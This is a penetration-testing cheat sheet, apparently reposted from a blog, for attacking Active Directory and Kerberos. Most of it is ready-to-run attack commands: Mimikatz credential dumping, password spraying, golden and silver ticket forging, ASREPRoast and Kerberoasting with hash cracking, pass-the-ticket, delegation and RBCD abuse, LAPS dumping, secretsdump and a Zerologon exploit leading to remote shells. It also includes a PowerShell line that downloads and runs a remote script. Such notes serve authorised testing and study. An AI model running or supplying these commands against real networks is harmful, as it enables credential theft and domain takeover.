# Active Directory / Kerbreos - Cheat Sheet
## Origin: https://meowmeowattack.wordpress.com/2022/10/27/pentest-notes-ad-kerberos/

# Cheatsheet
Kerberos cheatsheet: https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

# Tools
- AD attacks cheatsheet: https://wadcoms.github.io/
- Ghostpack: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
- PowerSharkPack: https://github.com/S3cur3Th1sSh1t/PowerSharpPack

```
# Each script is stored in gzip + base64 format
> base64 -d <b64-strings>
> gzip -d file.gz
```

### Bloodhound
```
# setup
> apt install bloodhound neo4j
> python3 -m pip install bloodhound

# run, default pass `neo4j:neo4j`
> neo4j console
> bloodhound --no-sandbox

# clear db in neo4j
> match (a) -[r] -> () delete a, r
> match (a) delete a

# bloodhound domain enum
> bloodhound-python -d {domain} -u <user> -p <pass> -dc <dc-ip> -c all -ns <target-ns>
> SharpHound.exe -c All --zipfilename output.zip
```

### Impacket setup
```
# updated to the latest impacket (remove the old one)
> apt remove --purge impacket-scripts python3-impacket
> apt autoremove

# Install:
> git clone https://github.com/SecureAuthCorp/impacket.git
> cd impacket
> python3 setup.py install
```

### Mimikatz
https://github.com/gentilkiwi/mimikatz
2.1.1 (win10 compatible): https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip
```
# Run interactively
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords full

# Run oneliner
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
```

### PowerView
PowerSploit: https://github.com/PowerShellMafia/PowerSploit
```
# Get all domain `computers`
Get-DomainComputer | % {Resolve-IPAddress -ComputerName $_.cn}
# Get all domain `users`
Get-NetUser
# Get domain `admins`
Get-DomainGroupMember -identity "Domain Admins" -Domain xor.com -DomainController <ip>
# Get domain `shares`
Find-DomainShare -CheckShareAccess -Domain xor.com -DomainController <ip>
```

# Kerberos auth flow
```
1a. Password converted to NTLM hash, a timestamp is encrypted with the hash and sent to the KDC as an authenticator in the authentication ticket (TGT) request (AS-REQ).
1b. The Domain Controller (KDC) checks user information (logon restrictions, group membership, etc) & creates Ticket-Granting Ticket (TGT).

2. The TGT is encrypted, signed, & delivered to the user (AS-REP).Only the Kerberos service (KRBTGT) in the domain can open and read TGT data

      User                                                                                      KDC

  (preauthentication)
ntlm = hash(password)                       ------ AS-REQ (TGT Req) ------>    Check user info/restrictions/groups
authenticator = hash(timestamp, ntlm)       <----- AS-REP (TGT Rep) -------     encrypt+sign(TGT, krbtgt)
Receives: TGT (encrypt+sign by krbtgt)


3. The User presents the TGT to the DC when requesting a Ticket Granting Service (TGS) ticket (TGS-REQ). The DC opens the TGT & validates PAC checksum – If the DC can open the ticket & the checksum check out, TGT = valid. The data in the TGT is effectively copied to create the TGS ticket
4. The TGS is encrypted using the target service accounts’ NTLM password hash and sent to the user (TGS-REP).

      User                                                                                      KDC

       TGT                                   -------- TGS-REQ ------------>           Validate & decrypt TGT
                                             <------- TGS-REP -------------           encrypt(TGS, target_service_ntlm)
Receives: TGS (encrypt+sign by target service)                                        If unconstrained delegation enabled
                                                                                      a copy of the TGT is inserted into the TGS


5. The user connects to the server hosting the service on the appropriate port & presents the TGS (AP-REQ). The service opens the TGS ticket using its NTLM password hash.

      User                                                                                   Service
      TGS                                    ----------- AP-REQ ----------->           Validate & descrypt TGS
                                                                                       If unconstrained delegation enabled
                                                                                       service opens the TGS and saves the user's
                                                                                       TGT in LSASS for impersonation usage
```

# Common Kerberos Attacks
### Kerbrute for brute forcing discovery of users, passwords
- https://github.com/ropnop/kerbrute/releases
- https://github.com/Sq00ky/attacktive-directory-tools
```
> kerbrute userenum -d {domain_name} --dc {dc_ip} userlist.tx

# with a list of users
> .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
> .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
### Silver Ticket (ST)
- Concept: The Silver ticket attack is based on crafting a valid TGS for a service once the NTLM hash of service is owned (like the PC account hash). Thus, it is possible to gain access to that service by forging a custom TGS as any user.
- linux:
```
# using impacket
> impacket-getTGT <domain>/<user>:<pass>
> impacket-getST -dc-ip <domain> -spn cifs/<domain-dc> '<domain>/<user>:<pass>'

# using ticketer
## To generate the TGS with NTLM
python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
## To generate the TGS with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# Use ticket
> export KRB5CCNAME=<ccache>
```
- windows:
```
# To generate the TGS with NTLM
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 128 key
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# Inject TGS with Mimikatz
mimikatz # kerberos::ptt <ticket_kirbi_file>

# Inject ticket with Rubeus:
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>

# Execute a cmd in the remote machine with PsExec:
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```
- If encountered KRB_AP_ERR_SKEW, that means your machine is out of sync with the dc’s time:
```
# Disable auto sync and update with the target dc
> timedatectl set-ntp false
> ntpdate -s <target-dc>
```
### Impersonation
- When compromised a host or account with some form of delegation rights configured.
- SPN must match one of the SPN’s the supplied account is authorized to perform delegation against.
```
# Impersonate as Administrator, the uid is 500 by convention
> getST.py -spn <spn>/<dc> '<domain>/<user>:<pass>' -impersonate Administrator -dc-ip <dc-ip>
> export KRB5CCNAME=Administrator.ccache

# Connect to mssql via the impersonated ticket
> mssqlclient.py <domain> -k
```

### Golden Ticket
- Concept: A valid TGT as any user can be created using the NTLM hash of the krbtgt AD account. The advantage of forging a TGT instead of TGS is being able to access any service (or machine) in the domain and the impersonated user. Moreover the credentials of krbtgt are never changed automatically.
```
# Benefits
* PE between two domains with configured trust relationships.
* Remain valid even if a users password expires or is changed
* To invalidate a Golden Ticket, need to change the krbtgt users password twice

# Pre-requisite
* NTLM hash of krbtgt user
* SID of target Domain
```
- linux:
```
# To get the domain SID
> lookupsid.py <domain>/<user>:<pass>@<dc-ip>

# Kerberos works with SIDs and not SAM usernames, the supplied username can be anything we like, even if the user does not exist
# By default, the forged ticket will contain SIDs for the following groups - 513, 512, 520, 518, 519. However, an alternative list of groups can be specified using -groups
# Additional Domain SIDs can be specified using the -extra-sid flag, which is useful for pivoting across domain trusts.
# NTLM hash can be generated using: https://codebeautify.org/ntlm-hash-generator
> ticketer.py -nthash <ntlm> -domain-sid <sid> -domain <domain> <fake-user> # <fake-user> can be arbitrary, usually Administrator
> ticketer.py -nthash <ntlm> -domain-sid <sid> -domain <domain> -user-id 500 Administrator -spn <spn>/<domain>

# use the ticket
export KRB5CCNAME=<fake-user>.ccache

# use psexec.py to pop a shell as the non-existent user <fake-user> on any host in the Domain for which the SID was provided
> psexec.py <domain>/<fake-user>@<dc> -k -no-pass -dc-ip <dc-ip> -target-ip <target-ip>
```
- windows:
```
# To generate the TGT with NTLM
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>

# To generate the TGT with AES 128 key
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>

# To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>

# Inject TGT with Mimikatz
mimikatz # kerberos::ptt <ticket_kirbi_file>

# Inject ticket with Rubeus:
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>

# Execute a cmd in the remote machine with PsExec:
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

### ASREPRoast
- The ASREPRoast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH).
- That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.
```
# check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

```
# check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
```

- Ticket cracking
```
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
john --wordlist=<passwords_file> <AS_REP_responses_file>
```

### Kerberoasting
- Concept:
1. Kerberos tickets are encrypted with the NTLM hash of the SPN for which they are requested.
2. SPN’s in Active Directory are often tied to user accounts to allow services such as Databases or Web Servers to access resources based upon permissions configured for Active Directory users.
3. The plaintext of the Kerberos ticket is known to the entity which requests it. As a result, it is possible to request Kerberos tickets for services that are configured with SPN’s tied to user accounts and perform a brute-force attack to figure out what password was used to encrypt the ticket.
4. In many instances, SPN’s will be tied to an over-privileged Active Directory accounts. Typically due to SPN’s being automatically configured by applications to have Administrative permissions, or system administrators deploying services where the required permissions are unknown so they just give the service Administrator permissions.
        
- If on the host:
```
# Enumerate Kerberoastable users
# 1) PowerView
> Import-Module .\PowerView.ps1
> Get-NetUser -SPN | select serviceprincipalname
# 2) setspn
> setspn.exe -T xor -Q */*
> setspn.exe -T <domain> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
# 3) Rubeus
> .\Rubeus.exe kerberosat /stats
```
- Technique 1: Ask for TGS and dump it from memory
```
# Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<spn>" #Example: MSSQLSvc/mgmt.domain.local 

# Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder
```
- Technique 2: Automatic tools
```
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
- Ticket cracking
```
# Transform kirbi ticket to john
> kirbi2john ticket.kirbi > ticket.john
* kirbi2hashcat: https://raw.githubusercontent.com/jarilaos/kirbi2hashcat/master/kirbi2hashcat.py

# Transform john to hashcat
> sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > ticket_tgs_hashcat

# Cracking tools
> john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
> hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

# Tickets handling
### Overpass The Hash/Pass The Key (PTK)
```
# Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
# Request the TGT with password
python getTGT.py <domain_name>/<user_name>:[password]
# If not provided, password is asked

# Set the TGT for impacket use
export KRB5CCNAME=<TGT_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

```
# Ask and inject the ticket
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt

# Execute a cmd in the remote machine
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

### Pass The Ticket (PTT)
- Harvest tickets from Linux:
```
> grep default_ccache_name /etc/krb5.conf

# If none return, default is FILE:/tmp/krb5cc_%{uid}.
# In case of file tickets, you can copy-paste (if you have permissions) for use them.

# In case of being KEYRING tickets, you can use tickey to get them:
#   https://github.com/TarlogicSecurity/tickey
#   To dump current user tickets, if root, try to dump them all by injecting in other user processes
#   to inject, copy tickey in a reachable folder by all users
cp tickey /tmp/tickey
/tmp/tickey -i
```
- Harvest tickets from Windows:
```
# mimikatz
mimikatz # sekurlsa::tickets /export

# Rubeus
.\Rubeus dump
# After dump with Rubeus tickets in base64, to write the in a file
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>"))
```

- To convert tickets between Linux/Windows format with ticket_converter.py:
```
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
```

- Using ticket in Linux:
```
# Set the ticket for impacket use
export KRB5CCNAME=<TGT_ccache_file_path>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

- Using ticket in Windows:
```
# Inject ticket with Mimikatz:
mimikatz # kerberos::ptt <ticket_kirbi_file>

# Inject ticket with Rubeus:
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>

# Execute a cmd in the remote machine with PsExec:
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

# Delegations
- Unconstrained delegation: Any service can be abused if one of their delegation entries is sensitive.
- Constrained delegation: Constrained entities can be abused if one of their delegation entries is sensitive.
- Resource-based constrained delegation (RBCD): Resource-based constrained entities can be abused if the entity itself is sensitive.

### Uncontrained delegation
```
# Check for unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description

# Check if there is a tgt
mimikatz.exe "sekurlsa::tickets" "exit"

# Send a req to cache the tgt
Invoke-WebRequest http://iis01.offense.local -UseDefaultCredentials -UseBasicParsing

# Check again if the tgt is cached
mimikatz.exe "privilege::debug" "mimikatz::tickets /export" "exit"

# Import the ticket
mimikatz.exe "kerberos::ptt C:\path\3c785-2-0-40e10000-Administrator@krbtgt-OFFENSE.LOCAL.kirbi" "exit"

# Enter a session
Enter-PSSession dc01
```

### Constrained delegation
- Assumption: compromised an account with constrained delegation configured
```
# Check for users with constrained delegation
# Attribute msds-allowedtodelegateto identifies the SPNs of services the user is trusted to delegate to (impersonate other domain users) and authenticate to.
Get-NetUser -TrustedToAuth

# request delegation ticket
.\Rubeus.exe tgtdeleg

# ticket is the base64 ticket we get with `rubeus's tgtdeleg`
Rubeus.exe s4u /ticket:<base64> /impersonateuser:administrator /domain:<domain> /msdsspn:<spn>/<dc> /dc:<dc> /ptt

# check the ticket
klist

# try to access the system and confirm we have been delegated
dir \\<dc>\c$
```

- Via computer account: If you have compromised a machine account (i.e SYSTEM level privileges on a machine) that is configured with constrained delegation, you can assume any identity in the AD domain and authenticate to services that the compromised machine is trusted to delegate to. e.g WS02 is trusted to delegate to DC01 for CIFS and LDAP services
```
# Check for computers with such delegation
Get-NetComputer ws02 | select name, msds-allowedtodelegateto, useraccountcontrol | fl
Get-NetComputer ws02 | Select-Object -ExpandProperty msds-allowedtodelegateto | fl

# impersonate administrator@offense.local and access DC
[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
$idToImpersonate.Impersonate()
[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name

ls \\<dc>\c$
```

### Resource-based Constrained Delegation: Computer Object Takeover
  1. https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
  2. It’s possible to gain code execution with elevated privileges on a remote computer if you have WRITE privilege on that computer’s AD object.
  3. Kerberos Delegation vs Resource Based Kerberos Delegation
   - In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to;
   - In resource based Kerberos delegation, computers (resources) specify who they trust and who can delegate authentications to them.
        
4. Check if attackable
```
# Check if the user is allowed to create new computers, i.e ms-ds-machineaccountquota
Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local

# check DC is at least Windows Server 2012
Get-DomainController

# Check the target computer WS01 object must not have the attribute msds-allowedtoactonbehalfofotheridentity set:
Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

5. Attack
```
# create a new computer object for our computer FAKE01. this is the computer that will be trusted by our target computer WS01 later
import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '<pass>' -AsPlainText -Force) -Verbose

# Check FAKE01 is created and the SID
Get-DomainComputer fake01
# computer SID: S-1-5-21-2552734371-813931464-1050690807-1154

# Create a new raw security descriptor for the FAKE01 computer principal:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Applying the security descriptor bytes to the target WS01 machine
# Ensure the user is able to WRITE to the target AD object
Get-DomainComputer ws01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

# Check msds-allowedtoactonbehalfofotheridentity is set
Get-DomainComputer ws01 -Properties 'msds-allowedtoactonbehalfofotheridentity'

# test if the security descriptor assigned to ws01 in msds-allowedtoactonbehalfofotheridentity attribute refers to the fake01$ machine:
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).Discretionary
# Note that the SID should refer to fake01$ machine's SID 

# generate the RC4 hash of the password we set for the FAKE01 computer:
.\Rubeus.exe hash /password:<pass> /user:fake01 /domain:<domain>

# Once we have the hash, we can execute the attack by requesting a kerberos ticket for fake01$ with ability to impersonate user spotless who is a Domain Admin:
.\Rubeus.exe s4u /user:fake01$ /domain:offense.local /rc4:<hash> /impersonateuser:spotless /msdsspn:http/ws01 /altservice:cifs,host /ptt

# Check that we now have access
ls \\ws01\c$
.\PsExec.exe \\ws01 cmd
```

# ldap: 389
- https://gist.github.com/tscherf/a0be193fe7bd603bbe1f511f9a00e737
```
> ldapsearch -x -H ldap://<domain> -D 'support\ldap' -w '<pass>' -b "CN=Users,DC=support,DC=htb"
```

### ldap domain search
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result) { Foreach($prop in $obj.Properties) { $prop } }
```

# NTLM leak
- https://github.com/Gl3bGl4z/All_NTLM_leak
- https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html
```
# Convert password to ntlm hash

# NTLM hash generator: https://codebeautify.org/ntlm-hash-generator
> python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
> iconv -f ASCII -t UTF-16LE <(printf "password") | openssl dgst -md4
```

# LAPS admin password
- Need an account that can write to the target group, ie WriteOwner
- Add a user to a group that has ReadLAPSPassword permission
- Read the Administrator’s LAPS password
```
# Collect AD forest info using bloodhound, locate the user and the target group
> bloodhound-python -c All -u <user> -p <pass> -dc <dc> -d <domain> -ns <ns>

# Connect via a user on the target
> evil-winrm -i <domain> -u <user> -p <password>
```

- On Windows target
```
# Upload and import module to the victim machine
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
upload PowerView.ps1
Import-Module .\PowerView.ps1

# Use the users that is an account operator to achieve the "adding user to group" operation
$SecPassword = ConvertTo-SecureString '<pass>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "<group>" -principalidentity "<domain>\<user>"
Add-DomainGroupMember -identity "<group>" -members "<domain>\<user>" -credential $Cred
```

- On kali
```
# lapsdumper
> lapsdumper -u <user> -p <pass> -d <domain> -l <dc-ip>
# or
# https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/
# https://chowdera.com/2022/04/202204042238391625.html
> wget https://raw.githubusercontent.com/n00py/LAPSDumper/main/laps.py
> python3 laps.py -u <user> -p <pass> -d <domain>

# With the password that results connect with evil-winrm as administrator
> evil-winrm -i <domain> -u Administrator -p '<dc:pass>'
```

# secretdump
- DA privilege needed to dump the secrets
- Retrieve all of the password hashes (if synced with the domain controller)
```
> secretsdump.py
```

# Zerologon
```
# Setup
> git clone https://github.com/risksense/zerologon.git

# Exploit
> python3 set_empty_pw.py <DC_NETBIOS_NAME> <DC_IP_ADDR>
> secretsdump.py -hashes :<ntlm> '<DOMAIN>/<DC_NETBIOS_NAME>@<dc_ip_addr>'
> wmiexec.py <domain>/Administrator@<ip> -hashes <hashes>
```

- crack original ntlm hash
```
> secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

- Reinstall the hashes to the domain. Reinstalling the original hash is necessary for the DC to continue to operate normally.
```
> python3 reinstall_original_pw.py <DC_NETBIOS_NAME> <DC_IP_ADDR> <ORIG_NT_HASH>
```

# ref
- https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html
- https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
- https://blog.harmj0y.net/activedirectory/s4u2pwnage/
